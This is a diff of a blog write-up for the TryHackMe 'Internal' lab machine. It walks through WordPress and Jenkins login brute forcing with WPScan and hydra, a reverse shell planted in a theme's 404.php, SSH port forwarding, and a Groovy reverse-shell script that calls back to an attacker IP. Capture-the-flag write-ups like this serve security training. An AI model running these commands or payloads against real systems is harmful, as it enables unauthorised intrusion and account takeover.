@@ -4,31 +4,17 @@ date : 2021-07-09T10:52:31+02:00
 author : "Lanfran02"
 cover : "cover.jpeg"
 useRelativeCover : true
-description : "TryHackMe's medium level machine."
-tags : ["TryHackMe"]
+description : "TryHackMe's Hard level machine."
+tags : ["gobuster","WPScan","nc","jenkins","docker","hydra","TryHackMe"]
 ---
 
 | Link | Level | Creator |
 |------|-------|---------|
-| [Here](https://tryhackme.com/room/)  | Medium  |  [user](https://tryhackme.com/p/)  |
-
-<!--
-description : "Maquina de nivel medio en TryHackMe."
-
-| Link | Nivel | Creador |
-|------|-------|---------|
-| [Aquí](https://tryhackme.com/room/)  | Medio  |  [user](https://tryhackme.com/p/)  |
-
-## Reconocimiento
-## Acceso inicial - Usuario
-
-
-¡Y hemos rooteado la máquina!
-
-Eso es todo de mi parte, ¡espero que lo encuentre útil!
--->
+| [Here](https://tryhackme.com/room/internal)  | Hard  |  [TheMayor](https://tryhackme.com/p/TheMayor)  |
 
 ## Reconn
+
+We won't start by doing anything new, just an `nmap` to the machine.
 
 ```bash
 ╰─ lanfran@parrot ❯ map 10.10.170.6                                                                                                ─╯
@@ -59,6 +45,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 34.25 seconds
 ```
+Let's see if we can find a hidden folder or endpoint with `gobuster`.
 
 ```bash
 ╰─ lanfran@parrot ❯ scan 10.10.170.6                                                                                               ─╯
@@ -88,9 +75,15 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2021/07/09 10:53:40 Finished
 ===============================================================
 ```
-`href="http://internal.thm/blog/index.php/feed/" />`
+Well, we found two interesting endpoints, `/blog` and `/wordpress`.
 
-let's add the new domain to `/etc/hosts`
+Navigating towards them, we find in the source code, what would be an HTML label that refers to the virtual domain of the machine.
+
+`href =" http: //internal.thm/blog/index.php/feed/ "/>`
+
+So let's add the new domain to `/etc/hosts`
+
+Since `/blog` has a `wordpress` behind it, let's run `WPScan` to get more information.
 
 ```bash
 ╰─ lanfran@parrot ❯ wpscan -e vp,vt,cb,u --url http://internal.thm/blog/                                                           ─╯
@@ -130,6 +123,9 @@ _______________________________________________________________
 [+] Memory used: 219.34 MB
 [+] Elapsed time: 00:00:18
 ```
+Returns interesting information, found an user: `admin`.
+
+Let's see if we can brute force the WordPress login with that user...
 
 ```bash
 ╰─ lanfran@parrot ❯ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt                             ─╯
@@ -166,15 +162,15 @@ Trying admin / bratz1 Time: 00:02:40 <                                          
 [+] Memory used: 237.906 MB
 [+] Elapsed time: 00:02:51
 ```
-Wp Admin password found.
+Cool!
+
+Now we have access to the admin panel of wordpress!
 
 ## Foothold - User
 
-Login in to WP-Admin we get our rev shell using the 404.php template.
+Logging into WP-Admin, we can get a reverse shell using the 404.php template from the twentyseventeen theme.
 
-`http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`
-
-We uploaded our shell there.
+And then we navigate to `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php` to get the connection!
 
 
 ```bash
@@ -189,7 +185,10 @@ www-data@internal:/var/www/html/wordpress/wp-content/themes/twentyseventeen$ who
 www-data
 ```
 
-We found a file, saving the password and user of aubreanna
+We made a breakthrough, we already have one foot in the machine.
+
+Looking through the files on the machine, we found a file containing the username and password of aubreanna!
+
 ```bash
 www-data@internal:/opt$ ls -la
 total 16
@@ -209,14 +208,21 @@ Password: [REDACTED]
 aubreanna@internal:/opt$ cat /home/aubreanna/user.txt 
 [REDACTED]
 ```
+We can log in with `su` and read the user flag.
 
 ## Root
+
+In the `home` directory of `aubreanna` there is a note, let's read it
 
 ```bash
 aubreanna@internal:~$ cat jenkins.txt 
 Internal Jenkins service is running on 172.17.0.2:8080
 aubreanna@internal:~$
 ```
+
+Hmm, there's a Jenkins service running ...
+
+Since we have the credentials of this user, let's forward that port to us for being able to access it from our PC.
 
 ```bash
 ╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm                                                             ─╯
@@ -252,6 +258,7 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
 Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
 aubreanna@internal:~$
 ```
+Hmm, if we now go to `127.0.0.1:8080` we will see the jenkins page requesting credentials, let's use `hydra` to brute force it.
 
 ```bash
 ╰─ lanfran@parrot ❯ hydra 127.0.0.1 -s 8080 -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt 
@@ -268,11 +275,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-09 11:42:
 
 ```
 
-`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy`
+Yes!! We get the username and password to be able to log in.
 
-we get the reverse shell,
+At the address `http://127.0.0.1:8080/script` we can execute a script!
 
-`http://127.0.0.1:8080/script`
+I will use a reverse shell of the repository [PayloadsAllTheThings](`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy`):
 
 ```java
 String host="10.9.1.222";
@@ -303,6 +310,9 @@ need access to the root user account.
 
 root:[REDACTED]
 ```
+YES! Reverse shell like `jenkins`!
+
+Looking through the directories again, I found the password for `root`!!
 
 ```bash
 ╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 root@internal.thm                                                                                                  ─╯
@@ -337,3 +347,7 @@ Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
 root@internal:~# cat root.txt 
 [REDACTED]
 ```
+
+And we rooted the machine!
+
+That's all from my side, hope you find this helpful!
